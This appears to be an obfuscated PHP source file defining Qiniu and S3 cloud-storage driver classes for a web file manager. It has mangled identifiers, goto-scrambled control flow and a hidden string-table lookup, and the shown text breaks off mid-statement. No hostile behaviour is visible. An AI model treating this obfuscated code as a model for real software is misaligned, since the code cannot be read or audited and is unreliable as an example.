<?php
 goto C¤²Ãº˜; D˜÷¸ÎŒ‡Ô: class PathDriverQiniu extends PathDriverBase { protected $accessKey = ''; protected $secret = ''; protected $domain = ''; protected $region = ''; protected $bucket = ''; protected $auth = null; protected $client = null; protected $config = null; protected $bucketManager = null; public $ioUploadServer = "\60"; public $ioFileOutServer = "\60"; public function __construct($dŸ‹Ó¥Û‰) { parent::__construct(); require_once SDK_DIR . $_SERVER[Šº][1289]; $this->_init($dŸ‹Ó¥Û‰); } public function _init($EÇ™Ñ¿’ˆ) { goto AÚÎ½ª¯‹‹; cù¢–„ø¼õ: $this->auth = new Qiniu\Auth($this->accessKey, $this->secret); $this->client = new Qiniu\Rtc\AppClient($this->auth); $this->config = new \Qiniu\Config(); goto A×°¡óï÷ó; A×°¡óï÷ó: $this->bucketManager = new \Qiniu\Storage\BucketManager($this->auth, $this->config); goto eŸ‘¨â­¾÷; AÚÎ½ª¯‹‹: $cÒñ°÷Ğö‰ =& $_SERVER[Šº]; foreach ($EÇ™Ñ¿’ˆ as $a¨Ò¶èÍòİ => $cËô‰ÈœÑÚ) { if (isset($this->{$a¨Ò¶èÍòİ})) { $this->{$a¨Ò¶èÍòİ} = $cËô‰ÈœÑÚ; } } if (empty($this->accessKey) || empty($this->secret) || empty($this->domain)) { throw new Exception($cÒñ°÷Ğö‰[1290] . LNG($cÒñ°÷Ğö‰[1249])); } goto cù¢–„ø¼õ; eŸ‘¨â­¾÷: } public function setBucketCors() { return !0; } public function getBucketCors() { return !0; } public function isBucketCors() { return !0; } public function mkfile($dˆÔ…‡¨æ¸, $Cñ®ŸÍ¶ƒò = '', $eéâœ“Íä = REPEAT_RENAME) { if ($this->setContent($dˆÔ…‡¨æ¸, $Cñ®ŸÍ¶ƒò)) { return $this->getPathOuter($dˆÔ…‡¨æ¸); } return !1; } public function mkdir($C‚ŠË—Êº, $C¸Ø¶¼–©ò = REPEAT_SKIP) { goto F‰â…˜õ’¨; CÒ¨Õ„ìÉ—: $C‚ŠË—Êº = $f‘Ù“ãƒÈŸ . $bœ„óĞİ±Ä[8]; $Aê¡ÂÁ¡à¶ = get_path_this($f‘Ù“ãƒÈŸ); $eãŸÄÎÍÏ = $C‚ŠË—Êº . $Aê¡ÂÁ¡à¶; goto bó”†ëˆ©; bó”†ëˆ©: if (!$this->mkfile($eãŸÄÎÍÏ)) { return !1; } if (!$this->moveFile($eãŸÄÎÍÏ, $C‚ŠË—Êº)) { $this->delFile($eãŸÄÎÍÏ); return !1; } return $this->getPathOuter($f‘Ù“ãƒÈŸ); goto CÀ¾¥‰é¸; F‰â…˜õ’¨: $bœ„óĞİ±Ä =& $_SERVER[Šº]; $f‘Ù“ãƒÈŸ = trim($C‚ŠË—Êº, $bœ„óĞİ±Ä[8]); if ($this->_isFolder($f‘Ù“ãƒÈŸ)) { return $this->getPathOuter($f‘Ù“ãƒÈŸ); } goto CÒ¨Õ„ìÉ—; CÀ¾¥‰é¸: } public function copyFile($f¡…Ù“ŞŸ‰, $Cøï¼ºµø) { $a¬ñß‘ÄŞÌ = $this->bucketManager->copy($this->bucket, $f¡…Ù“ŞŸ‰, $this->bucket, $Cøï¼ºµø, !0); return $a¬ñß‘ÄŞÌ ? !1 : $this->getPathOuter($Cøï¼ºµø); } public function moveFile($CÚ”¿ñ‚Õù, $cŒ™•ˆ§‚) { $D¼³¤Ÿ‚§¸ = $this->bucketManager->move($this->bucket, $CÚ”¿ñ‚Õù, $this->bucket, $cŒ™•ˆ§‚, !0); return $D¼³¤Ÿ‚§¸ ? !1 : $this->getPathOuter($cŒ™•ˆ§‚); } public function delFile($E©×‚íÖµù) { if (!$this->exist($E©×‚íÖµù)) { return !0; } $C°ƒ§ÆšŠ = $this->bucketManager->delete($this->bucket, $E©×‚íÖµù); return $C°ƒ§ÆšŠ ? !1 : !0; } public function delFolder($EĞÊàŸ—åÙ) { goto C©è—õŒÜç; C©è—õŒÜç: $fñÊ„¥ß¬ç =& $_SERVER[Šº]; if (!$this->exist($EĞÊàŸ—åÙ)) { return !0; } $this->listItemCache = !1; goto fÎí’¬©Š¥; AƒŸÃ‰Ìá: return $this->delByBatch($d˜Ú‰Ü˜åÄ[$fñÊ„¥ß¬ç[75]]); goto f´±îì·ì; DÊŸøì„È‚: if (!empty($EĞÊàŸ—åÙ) && !in_array($eïµÁ‘µÇ“, $d˜Ú‰Ü˜åÄ[$fñÊ„¥ß¬ç[75]])) { $d˜Ú‰Ü˜åÄ[$fñÊ„¥ß¬ç[75]][] = $eïµÁ‘µÇ“; } $Cô´ê·°˜ = $this->delByBatch($d˜Ú‰Ü˜åÄ[$fñÊ„¥ß¬ç[74]]); if (!$Cô´ê·°˜) { return !1; } goto AƒŸÃ‰Ìá; fÎí’¬©Š¥: $d˜Ú‰Ü˜åÄ = $this->fileList($EĞÊàŸ—åÙ); $this->listItemCache = !0; $eïµÁ‘µÇ“ = trim($EĞÊàŸ—åÙ, $fñÊ„¥ß¬ç[8]) . $fñÊ„¥ß¬ç[8]; goto DÊŸøì„È‚; f´±îì·ì: } private function delByBatch($B†´„¿áöÚ) { foreach (array_chunk($B†´„¿áöÚ, 1000) as $CœãØõ‘‹Ì) { $A±†ÆäğŸ… = $this->bucketManager->buildBatchDelete($this->bucket, $CœãØõ‘‹Ì); list($FÉªÃ”ø×¶, $e·®º¬±ö) = $this->bucketManager->batch($A±†ÆäğŸ…); if ($e·®º¬±ö) { return !1; } } return !0; } public function rename($C¹Çù»ÏÍØ, $aÇÑ’ÁŒ) { return $this->renameObject($C¹Çù»ÏÍØ, $aÇÑ’ÁŒ); } public function fileInfo($b… ½È•Ì, $eƒ Àê»‹ = false, $DÓÑ“àŠâî = array()) { goto cŠ…öö„ø¢; cŠ…öö„ø¢: $E·óª’Ÿ¬ =& $_SERVER[Šº]; $c±’¼øÇî¢ = array($E·óª’Ÿ¬[28] => $this->pathThis($b… ½È•Ì), $E·óª’Ÿ¬[76] => $this->getPathOuter($E·óª’Ÿ¬[8] . $b… ½È•Ì), $E·óª’Ÿ¬[29] => $E·óª’Ÿ¬[192], $E·óª’Ÿ¬[78] => isset($DÓÑ“àŠâî[$E·óª’Ÿ¬[1291]]) ? $DÓÑ“àŠâî[$E·óª’Ÿ¬[1291]] : 0, $E·óª’Ÿ¬[168] => $this->ext($b… ½È•Ì)); if ($eƒ Àê»‹) { return $c±’¼øÇî¢; } goto CõäáÈÍÊ; CõäáÈÍÊ: $c±’¼øÇî¢[$E·óª’Ÿ¬[193]] = $c±’¼øÇî¢[$E·óª’Ÿ¬[84]] = 0; $c±’¼øÇî¢[$E·óª’Ÿ¬[194]] = $c±’¼øÇî¢[$E·óª’Ÿ¬[195]] = !0; if (empty($DÓÑ“àŠâî)) { $DÓÑ“àŠâî = $this->objectMeta($b… ½È•Ì); if (!$DÓÑ“àŠâî) { return $c±’¼øÇî¢; } } goto bÛµ÷ÑÂî; bÛµ÷ÑÂî: if (isset($DÓÑ“àŠâî[$E·óª’Ÿ¬[1292]])) { $c±’¼øÇî¢[$E·óª’Ÿ¬[84]] = substr($DÓÑ“àŠâî[$E·óª’Ÿ¬[1292]] . $E·óª’Ÿ¬[33], 0, 10); } if (isset($DÓÑ“àŠâî[$E·óª’Ÿ¬[1291]])) { $c±’¼øÇî¢[$E·óª’Ÿ¬[78]] = $DÓÑ“àŠâî[$E·óª’Ÿ¬[1291]]; } return $c±’¼øÇî¢; goto c·ö¦é¤¾º; c·ö¦é¤¾º: } public function folderInfo($AÛ‡„˜—ˆÆ, $EåÎÌô‚†‰ = false) { goto c’¬Ùó©Ğ¶; c„í ŒÒªƒ: $f÷›¯ùäŠ[$f§ìà‘‚[193]] = $f÷›¯ùäŠ[$f§ìà‘‚[84]] = 0; $f÷›¯ùäŠ[$f§ìà‘‚[194]] = $f÷›¯ùäŠ[$f§ìà‘‚[195]] = !0; $AÛ‡„˜—ˆÆ = rtrim($AÛ‡„˜—ˆÆ, $f§ìà‘‚[8]) . $f§ìà‘‚[8]; goto fãâàŸŠ¡à; c’¬Ùó©Ğ¶: $f§ìà‘‚ =& $_SERVER[Šº]; $f÷›¯ùäŠ = array($f§ìà‘‚[28] => $this->pathThis($AÛ‡„˜—ˆÆ), $f§ìà‘‚[76] => $this->getPathOuter($f§ìà‘‚[8] . $AÛ‡„˜—ˆÆ), $f§ìà‘‚[29] => $f§ìà‘‚[77]); if ($EåÎÌô‚†‰) { return $f÷›¯ùäŠ; } goto c„í ŒÒªƒ; fãâàŸŠ¡à: $B¢îÁÙêƒÓ = $this->objectMeta($AÛ‡„˜—ˆÆ); if (isset($B¢îÁÙêƒÓ[$f§ìà‘‚[1292]])) { $f÷›¯ùäŠ[$f§ìà‘‚[84]] = substr($B¢îÁÙêƒÓ[$f§ìà‘‚[1292]] . $f§ìà‘‚[33], 0, 10); } return $f÷›¯ùäŠ; goto c‡‚ê°ø¦³; c‡‚ê°ø¦³: } public function listPath($Aõ™°»£èÕ, $Cª¥»¡‘“ = false) { $dó³ìªîÃİ =& $_SERVER[Šº]; $aš­ğ‚¢Äš = $this->fileList($Aõ™°»£èÕ, $dó³ìªîÃİ[8], !0); foreach ($aš­ğ‚¢Äš[$dó³ìªîÃİ[75]] as $Aé¯àöÚê‡ => $cˆ‚„é‘‡) { $aš­ğ‚¢Äš[$dó³ìªîÃİ[75]][$Aé¯àöÚê‡] = $this->folderInfo($cˆ‚„é‘‡, $Cª¥»¡‘“); } foreach ($aš­ğ‚¢Äš[$dó³ìªîÃİ[74]] as $Aé¯àöÚê‡ => $cˆ‚„é‘‡) { $aš­ğ‚¢Äš[$dó³ìªîÃİ[74]][$Aé¯àöÚê‡] = $this->fileInfo($cˆ‚„é‘‡[$dó³ìªîÃİ[93]], $Cª¥»¡‘“, $cˆ‚„é‘‡); } return $aš­ğ‚¢Äš; } public function has($DÄá˜ƒ©¥, $fÛâÜ··¤© = false, $C¿âÅ¦Â«ƒ = true) { goto Cò¡ù½„Æ’; a¾ªÈõˆ‹ß: return !1; goto eÖ»‡¯åÓ; Cò¡ù½„Æ’: $Dç»ÍäÎš =& $_SERVER[Šº]; $DÄá˜ƒ©¥ = trim($DÄá˜ƒ©¥, $Dç»ÍäÎš[8]); $D¼Š£—‹¥ = empty($DÄá˜ƒ©¥) ? $Dç»ÍäÎš[33] : $DÄá˜ƒ©¥ . $Dç»ÍäÎš[8]; goto dôÚî¨àà·; c¨‘Œâø«: $eâèìĞ•ï´ = $CÆ¢½í¾øñ = 0; while (!0) { check_abort(); list($F‹„²Ù¶Ùğ, $EÕ’ÉÁÊõÈ) = $this->bucketManager->listFiles($this->bucket, $D¼Š£—‹¥, $f‰©›ÛÊ‘ô, $cƒ»Å¿Áô¹, $f³ÍåÄ‡õî); if ($EÕ’ÉÁÊõÈ) { break; } $f‰©›ÛÊ‘ô = array_key_exists($Dç»ÍäÎš[1261], $F‹„²Ù¶Ùğ) ? $f‰©›ÛÊ‘ô = $F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1293]] : $Dç»ÍäÎš[33]; if ($fÛâÜ··¤©) { if (!empty($F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1294]])) { $eâèìĞ•ï´ += count($F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1294]]); } if (!empty($F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1295]])) { $CÆ¢½í¾øñ += count($F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1295]]); } if ($f‰©›ÛÊ‘ô === $Dç»ÍäÎš[33]) { break; } continue; } if ($C¿âÅ¦Â«ƒ) { if (!empty($F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1294]])) { return !0; } } else { if (!empty($F‹„²Ù¶Ùğ[$Dç»ÍäÎš[1295]])) { return !0; } } if ($f‰©›ÛÊ‘ô === $Dç»ÍäÎš[33]) { break; } } if ($fÛâÜ··¤©) { return array($Dç»ÍäÎš[202] => $eâèìĞ•ï´, $Dç»ÍäÎš[203] => $CÆ¢½í¾øñ); } goto a¾ªÈõˆ‹ß; dôÚî¨àà·: $f‰©›ÛÊ‘ô = $Dç»ÍäÎš[33]; $cƒ»Å¿Áô¹ = 500; $f³ÍåÄ‡õî = $Dç»ÍäÎš[8]; goto c¨‘Œâø«; eÖ»‡¯åÓ: } public function listAll($cË˜Ã²àÊî) { $Bš¡‹Ãé± =& $_SERVER[Šº]; $D±‹å¦õ×¨ = $this->fileList($cË˜Ã²àÊî, $Bš¡‹Ãé±[33], !0); $a†âç¨ìÊ = array(); foreach ($D±‹å¦õ×¨[$Bš¡‹Ãé±[74]] as $b¨®¨ªµ) { $a†âç¨ìÊ[$b¨®¨ªµ[$Bš¡‹Ãé±[93]]] = $b¨®¨ªµ[$Bš¡‹Ãé±[78]]; } foreach ($D±‹å¦õ×¨[$Bš¡‹Ãé±[75]] as $b¨®¨ªµ) { if (is_string($b¨®¨ªµ)) { $a†âç¨ìÊ[$b¨®¨ªµ] = 0; } } return $this->listAllFiles($cË˜Ã²àÊî, array_keys($a†âç¨ìÊ), $a†âç¨ìÊ); } private function fileList($A¥Ô„‘ï¡, $cÙ„Ô¿‘ÑÎ = '', $dĞÂÔíˆˆÄ = 0) { goto d£Ø’ëÚ÷; d‡ÂÄçœŸ•: return array($E—Ï©å­É˜[75] => $b‡ëèÓÏºŒ, $E—Ï©å­É˜[74] => $f¸¦İéó¾Í); goto e¢ß‡Ù®ô‘; d£Ø’ëÚ÷: $E—Ï©å­É˜ =& $_SERVER[Šº]; $A¥Ô„‘ï¡ = trim($A¥Ô„‘ï¡, $E—Ï©å­É˜[8]); $f¨‚¦Öîñ© = empty($A¥Ô„‘ï¡) ? $E—Ï©å­É˜[33] : $A¥Ô„‘ï¡ . $E—Ï©å­É˜[8]; goto EÂµÑôÅ; cß¹¤İœ¦: $b‡ëèÓÏºŒ = $f¸¦İéó¾Í = array(); while (!0) { check_abort(); list($E›µ±ßéñ», $bÃ¼“êÏ»ã) = $this->bucketManager->listFiles($this->bucket, $f¨‚¦Öîñ©, $dÎÄó³¢™Ï, $A‰ÙÅ‘¨ÎÂ, $cÙ„Ô¿‘ÑÎ); if ($bÃ¼“êÏ»ã) { break; } $dÎÄó³¢™Ï = array_key_exists($E—Ï©å­É˜[1261], $E›µ±ßéñ») ? $dÎÄó³¢™Ï = $E›µ±ßéñ»[$E—Ï©å­É˜[1293]] : $E—Ï©å­É˜[33]; $b°§Ÿ—Ã¸¤ = isset($E›µ±ßéñ»[$E—Ï©å­É˜[1294]]) ? $E›µ±ßéñ»[$E—Ï©å­É˜[1294]] : array(); $FŞõÛë•¤Â = isset($E›µ±ßéñ»[$E—Ï©å­É˜[1295]]) ? $E›µ±ßéñ»[$E—Ï©å­É˜[1295]] : array(); foreach ($b°§Ÿ—Ã¸¤ as $fõéˆë”—) { goto A òƒ¾ÛÛ; d†µÜŠëĞ¤: $fõéˆë”—[$E—Ï©å­É˜[78]] = $aš‹»Òóİá; $DÓ’˜Ú“Š³ = $aš‹»Òóİá == 0 && substr($E£ñ®ĞâËÖ, strlen($E£ñ®ĞâËÖ) - 1, 1) == $E—Ï©å­É˜[8] ? !0 : !1; if ($C«Ç÷Ñº¤) { $this->cacheMethod($E—Ï©å­É˜[198], $E£ñ®ĞâËÖ, $DÓ’˜Ú“Š³); $this->cacheMethod($E—Ï©å­É˜[199], $E£ñ®ĞâËÖ, $fõéˆë”—); } goto fˆŸ¼‡µÂá; A òƒ¾ÛÛ: if ($fõéˆë”—[$E—Ï©å­É˜[93]] == $f¨‚¦Öîñ©) { continue; } $E£ñ®ĞâËÖ = $fõéˆë”—[$E—Ï©å­É˜[93]]; $aš‹»Òóİá = $fõéˆë”—[$E—Ï©å­É˜[1291]]; goto d†µÜŠëĞ¤; fˆŸ¼‡µÂá: if ($DÓ’˜Ú“Š³) { $b‡ëèÓÏºŒ[] = $E£ñ®ĞâËÖ; continue; } $f¸¦İéó¾Í[] = $dĞÂÔíˆˆÄ ? $fõéˆë”— : $E£ñ®ĞâËÖ; goto bİö¤Ğ“¼; bİö¤Ğ“¼: } foreach ($FŞõÛë•¤Â as $E£ñ®ĞâËÖ) { if ($E£ñ®ĞâËÖ == $f¨‚¦Öîñ©) { continue; } $b‡ëèÓÏºŒ[] = $E£ñ®ĞâËÖ; if ($C«Ç÷Ñº¤) { $this->cacheMethod($E—Ï©å­É˜[198], $E£ñ®ĞâËÖ, !0); } } if ($dÎÄó³¢™Ï === $E—Ï©å­É˜[33]) { break; } } if ($C«Ç÷Ñº¤) { $this->cacheMethod($E—Ï©å­É˜[198], $A¥Ô„‘ï¡, !0); } goto d‡ÂÄçœŸ•; EÂµÑôÅ: $dÎÄó³¢™Ï = $E—Ï©å­É˜[33]; $A‰ÙÅ‘¨ÎÂ = 1000; $C«Ç÷Ñº¤ = $this->listItemCache === !1 ? !1 : !0; goto cß¹¤İœ¦; e¢ß‡Ù®ô‘: } public function canRead($DËÍÇà²»ò) { return $this->exist($DËÍÇà²»ò) ? !0 : !1; } public function canWrite($C½ö„È©‘) { return $this->exist($C½ö„È©‘) ? !0 : !1; } public function getContent($bÏíº‹©Ö¦) { return $this->fileSubstr($bÏíº‹©Ö¦, 0, -1); } public function setContent($fÖâÁØÍ†¹, $aœëÅÍ«ÃÕ = '') { $cØÊŒööÂù = $this->tempFile($this->pathThis($fÖâÁØÍ†¹)); file_put_contents($cØÊŒööÂù, $aœëÅÍ«ÃÕ); if ($this->upload($fÖâÁØÍ†¹, $cØÊŒööÂù)) { $this->tempFileRemve($cØÊŒööÂù); return !0; } return !1; } public function refreshUrls($CÃã©ƒõ‡æ) { goto D¹ÈŠšÃŞ; D¹ÈŠšÃŞ: $e¾ÈÎÓ =& $_SERVER[Šº]; $eì£‡ï¯Ÿ• = array(); if (is_array($CÃã©ƒõ‡æ)) { foreach ($CÃã©ƒõ‡æ as $E”Äé’ì‡‹) { $eì£‡ï¯Ÿ•[] = $this->link($E”Äé’ì‡‹); } } else { $eì£‡ï¯Ÿ•[] = $this->link($CÃã©ƒõ‡æ); } goto D‡ó›˜³’; D‡ó›˜³’: $A‘—Óµé©µ = new Qiniu\Cdn\CdnManager($this->auth); list($cë£À²ÌÅ”, $cñ»©¥Ì¢Â) = $A‘—Óµé©µ->refreshUrls($eì£‡ï¯Ÿ•); if ($cñ»©¥Ì¢Â) { return !1; } goto c‘ù–ÇÃ£í; c‘ù–ÇÃ£í: return $cë£À²ÌÅ”[$e¾ÈÎÓ[1066]] == $e¾ÈÎÓ[718] ? !0 : !1; goto FÊ°ï×È˜; FÊ°ï×È˜: } public function fileSubstr($bŠ²š´Ã•½, $a°ë…çëÏ“, $E”Øõ×š) { $Dİ³ßõ³› =& $_SERVER[Šº]; if (!($eÁ¬‘”–÷˜ = $this->link($bŠ²š´Ã•½))) { return !1; } $b±•œ•äºé = !1; if ($E”Øõ×š > 0) { $B‚ñ•ÇåŠî = $a°ë…çëÏ“ + $E”Øõ×š - 1; $b±•œ•äºé = array($Dİ³ßõ³›[1296] . $a°ë…çëÏ“ . $Dİ³ßõ³›[447] . $B‚ñ•ÇåŠî); } $fàÖÀéæËŠ = url_request($eÁ¬‘”–÷˜, $Dİ³ßõ³›[227], !1, $b±•œ•äºé); return $fàÖÀéæËŠ[$Dİ³ßõ³›[711]] ? $fàÖÀéæËŠ[$Dİ³ßõ³›[1076]] : !1; } public function upload($Cò—Â‚Š²½, $EéÉ×„˜‹, $eÀÔ‘ñ¶²¾ = false, $fò”ì„Ú“ = REPEAT_REPLACE) { $CõÒ ¸ëÆç = new Qiniu\Storage\UploadManager(); $dâˆ¯ƒò…µ = $this->auth->uploadToken($this->bucket, $Cò—Â‚Š²½); $B¦Ñ¯£–»Ò = get_file_mime(get_path_ext($EéÉ×„˜‹)); list($eô¯¦Â×ó¯, $DÂ²¢ÏÍ) = $CõÒ ¸ëÆç->putFile($dâˆ¯ƒò…µ, $Cò—Â‚Š²½, $EéÉ×„˜‹, null, $B¦Ñ¯£–»Ò); return $DÂ²¢ÏÍ ? !1 : $this->getPathOuter($Cò—Â‚Š²½); } public function uploadFormData($eìÊí¥‹šà, $CÆ‚„¯à· = 3600) { return $this->uploadToken($eìÊí¥‹šà, $CÆ‚„¯à·); } public function multiUploadFormData($c‘‡‹ŠíöŠ, $AïÇê•ËÀÕ = 3600) { return $this->uploadToken($c‘‡‹ŠíöŠ, $AïÇê•ËÀÕ); } private function uploadToken($C‡õ—Œ‘·, $f‚Óš…©® = 3600) { goto C¹ ç¸˜Ç; Cñİè‚áã†: $b‘¨ì›Ò  = http_type() . "\72\57\57\165\x70\x6c\x6f\141\144{$C¹õŠµ¼ó}\56\161\x69\x6e\x69\165\160\56\x63\x6f\x6d\57"; return array($dä¥¦İéŞö[1300] => $eæãé¿ã·í, $dä¥¦İéŞö[1301] => $b‘¨ì›Ò ); goto b…‡»ø–…; E´à«ğïŒ“: $F°ùÎß·À‰ = $C‡õ—Œ‘·; $eæãé¿ã·í = $this->auth->uploadToken($this->bucket, $F°ùÎß·À‰, $CÔÀ®¥óÙ, $c ’’®¥¿, !0); $C¹õŠµ¼ó = empty($this->region) || $this->region == $dä¥¦İéŞö[1299] ? $dä¥¦İéŞö[33] : $dä¥¦İéŞö[447] . $this->region; goto Cñİè‚áã†; C¹ ç¸˜Ç: $dä¥¦İéŞö =& $_SERVER[Šº]; $CÔÀ®¥óÙ = $f‚Óš…©®; $c ’’®¥¿ = array($dä¥¦İéŞö[1297] => $dä¥¦İéŞö[1298]); goto E´à«ğïŒ“; b…‡»ø–…: } public function download($DÒãÉÖÉ¡Ü, $A‹È‚îñ¤À) { goto bŠ»ğ­ƒ¨÷; bŠ»ğ­ƒ¨÷: $aº‚ ç¾í´ = IO::getPathInner(IO::mkfile($A‹È‚îñ¤À)); if (!($cÂÔ‘î—´ = $this->link($DÒãÉÖÉ¡Ü))) { return !1; } $cÅ ¹«§— = 0; goto dì ‰­á; dì ‰­á: $E¾ÁªäÒÄ = 1024 * 200; $dòéä›Ãâá = fopen($aº‚ ç¾í´, $_SERVER[Šº][1302]); while (!0) { $F¢ø²‚»Á = $this->fileSubstr($DÒãÉÖÉ¡Ü, $cÅ ¹«§—, $E¾ÁªäÒÄ); if ($F¢ø²‚»Á === !1) { return !1; } fwrite($dòéä›Ãâá, $F¢ø²‚»Á); $cÅ ¹«§— += $E¾ÁªäÒÄ; if (strlen($F¢ø²‚»Á) < $E¾ÁªäÒÄ) { break; } } goto AñŞ¸ŠÏñì; AñŞ¸ŠÏñì: fclose($dòéä›Ãâá); return $A‹È‚îñ¤À; goto eğ‰„‡ ; eğ‰„‡ : } public function link($cãŸ„„¢«ô, $f‚µ§ì‡œ· = '') { if (!$this->isFile($cãŸ„„¢«ô)) { return !1; } $A‘éŠŒÔ‚º = $this->getHost() . $_SERVER[Šº][8] . $this->pathEncode($cãŸ„„¢«ô) . $f‚µ§ì‡œ·; return $this->auth->privateDownloadUrl($A‘éŠŒÔ‚º, 3600 * 12); } public function fileOut($e£µ–ê‹ï, $E–Ë©Í£Ç = false, $Dª¢ÄÅ‹äÒ = false, $BÁ ê…ˆ„ = '') { $DË¬¼ŞŒš =& $_SERVER[Šº]; if ($this->isFileOutServer()) { return $this->fileOutServer($e£µ–ê‹ï, $E–Ë©Í£Ç, $Dª¢ÄÅ‹äÒ, $BÁ ê…ˆ„); } if (!$Dª¢ÄÅ‹äÒ) { $Dª¢ÄÅ‹äÒ = $this->pathThis($e£µ–ê‹ï); } $EîÖåÁ‚âÊ = $E–Ë©Í£Ç ? $DË¬¼ŞŒš[1303] . rawurlencode($Dª¢ÄÅ‹äÒ) : $DË¬¼ŞŒš[33]; $Aàº¢¡µÊ× = $this->link($e£µ–ê‹ï, $EîÖåÁ‚âÊ); $this->fileOutLink($Aàº¢¡µÊ×); } public function fileOutServer($B…™“¼›ß, $e¿¤öÆ¢Î = false, $bÇ†öãÎ¡ = false, $A³ì¿ ÷ˆÚ = '') { parent::fileOut($B…™“¼›ß, $e¿¤öÆ¢Î, $bÇ†öãÎ¡, $A³ì¿ ÷ˆÚ); } public function fileOutImage($CÉéˆíÊ±à, $DŞÓ¯óáä‘ = 250) { $fé‘î•Î’â = $this->link($CÉéˆíÊ±à, $_SERVER[Šº][1304] . $DŞÓ¯óáä‘); $this->fileOutLink($fé‘î•Î’â); } public function fileOutImageServer($eµÆÌ¤¡³Á, $AôÏ¢¶é•Š = 250) { parent::fileOutImage($eµÆÌ¤¡³Á, $AôÏ¢¶é•Š); } public function hashMd5($D®ÈçÕ‰É‡) { $EïÌè¤©Ù =& $_SERVER[Šº]; $D¼Õ²²² = $this->objectMeta($D®ÈçÕ‰É‡); return isset($D¼Õ²²²[$EïÌè¤©Ù[207]]) ? $D¼Õ²²²[$EïÌè¤©Ù[207]] : !1; $A˜½¿‡İ³ = $this->link($D®ÈçÕ‰É‡, $EïÌè¤©Ù[1305]); } public function size($EÚ´ˆ“°ˆ®) { $C §Ë¬–Ï½ = $this->objectMeta($EÚ´ˆ“°ˆ®); return $C §Ë¬–Ï½ ? $C §Ë¬–Ï½[$_SERVER[Šº][78]] : 0; } public function info($aÚó¡™†¤Ï) { if ($this->isFolder($aÚó¡™†¤Ï)) { return $this->folderInfo($aÚó¡™†¤Ï); } else { if ($this->isFile($aÚó¡™†¤Ï)) { return $this->fileInfo($aÚó¡™†¤Ï); } } return !1; } public function exist($FÚ¨…•ãæ¢) { return $this->isFile($FÚ¨…•ãæ¢) || $this->isFolder($FÚ¨…•ãæ¢); } public function isFile($f—§î·ÏÂ) { return !$this->isFolder($f—§î·ÏÂ) && $this->objectMeta($f—§î·ÏÂ); } public function isFolder($bóœ¼Êô¼) { return $this->cacheMethod($_SERVER[Šº][198], $bóœ¼Êô¼); } protected function objectMeta($bò£ŠÀäœ•) { return $this->cacheMethod($_SERVER[Šº][199], $bò£ŠÀäœ•); } protected function _objectMeta($dã„ØÎÉÚ) { $E‰·å¬Â¨ =& $_SERVER[Šº]; list($e…²­öš¢¼, $e°¾½Éµà) = $this->bucketManager->stat($this->bucket, $dã„ØÎÉÚ); if ($e…²­öš¢¼) { $e…²­öš¢¼[$E‰·å¬Â¨[78]] = intval($e…²­öš¢¼[$E‰·å¬Â¨[1291]]); } return $e…²­öš¢¼; } protected function _isFolder($E°ÅÏ÷©Ñ‰) { $cÜÁä‰³Ã§ =& $_SERVER[Šº]; if ($E°ÅÏ÷©Ñ‰ == $cÜÁä‰³Ã§[33] || $E°ÅÏ÷©Ñ‰ == $cÜÁä‰³Ã§[8]) { return !0; } list($cˆ°àë’•à, $cø‚’´·) = $this->bucketManager->listFiles($this->bucket, trim($E°ÅÏ÷©Ñ‰, $cÜÁä‰³Ã§[8]) . $cÜÁä‰³Ã§[8], $cÜÁä‰³Ã§[33], 1, $cÜÁä‰³Ã§[8]); return !empty($cˆ°àë’•à[$cÜÁä‰³Ã§[1294]]) || !empty($cˆ°àë’•à[$cÜÁä‰³Ã§[1295]]) ? !0 : !1; } } class PathDriverS3 extends PathDriverBaseS3 { public function __construct($aìÔÆ˜¡‚ß) { parent::__construct($aìÔÆ˜¡‚ß); } public function uploadFormData($DÜ°ÉÕõ, $CïÉÌ¢…ê = 3600) { goto a»ŠíòÁ; bÇÓºÕ…ÂÎ: $Aï¯Õä½ = base64_encode(json_encode($f¤­´æĞ™ˆ)); $C¸¾˜à˜£ = hash_hmac($d‚Ñì…ª¹¤[1220], $c§·µ¦»á, $d‚Ñì…ª¹¤[1221] . $this->secret, !0); $f ¶¿Ò£³ = hash_hmac($d‚Ñì…ª¹¤[1220], $this->region, $C¸¾˜à˜£, !0); goto Féœ‘¨‡õ; A—÷Å˜Œ¬: $A‚Šá Š¨ì = array($this->accessKey, $c§·µ¦»á, $this->region, $dÚĞ‡‰Ôõã, $A¨†Ô¡Üí); $DÇÎ˜ÜˆĞ… = implode($d‚Ñì…ª¹¤[8], $A‚Šá Š¨ì); $f¤­´æĞ™ˆ = array($d‚Ñì…ª¹¤[1177] => gmdate($d‚Ñì…ª¹¤[1176], strtotime($d‚Ñì…ª¹¤[1213])), $d‚Ñì…ª¹¤[1178] => array(array($d‚Ñì…ª¹¤[1180] => $this->bucket), array($d‚Ñì…ª¹¤[1179] => $cĞÏÃå„ˆë), array($d‚Ñì…ª¹¤[1181], $d‚Ñì…ª¹¤[1182], $d‚Ñì…ª¹¤[33]), array($d‚Ñì…ª¹¤[1181], $d‚Ñì…ª¹¤[1214], $d‚Ñì…ª¹¤[33]), array($d‚Ñì…ª¹¤[1181], $d‚Ñì…ª¹¤[1215], $d‚Ñì…ª¹¤[33]), array($d‚Ñì…ª¹¤[1183] => $c™ª›®Ó¾ˆ), array($d‚Ñì…ª¹¤[1216] => $DÇÎ˜ÜˆĞ…), array($d‚Ñì…ª¹¤[1217] => $A›Ôï‹ˆÑ), array($d‚Ñì…ª¹¤[1218] => $aÄÑ¯‰Ç), array($d‚Ñì…ª¹¤[1219] => $dÖ‹ÃçßËó))); goto bÇÓºÕ…ÂÎ; e‰ÌÉ”Ä²î: $A¨†Ô¡Üí = $d‚Ñì…ª¹¤[1212]; $dÖ‹ÃçßËó = $CïÉÌ¢…ê . $d‚Ñì…ª¹¤[33]; $c™ª›®Ó¾ˆ = $d‚Ñì…ª¹¤[1175]; goto A—÷Å˜Œ¬; Dœ•™Ü´÷: $AÀß®¢”´ = array($d‚Ñì…ª¹¤[210] => $d‚Ñì…ª¹¤[33], $d‚Ñì…ª¹¤[1222] => $d‚Ñì…ª¹¤[33], $d‚Ñì…ª¹¤[1179] => $cĞÏÃå„ˆë, $d‚Ñì…ª¹¤[1183] => $c™ª›®Ó¾ˆ, $d‚Ñì…ª¹¤[1187] => $Aï¯Õä½, $d‚Ñì…ª¹¤[1223] => 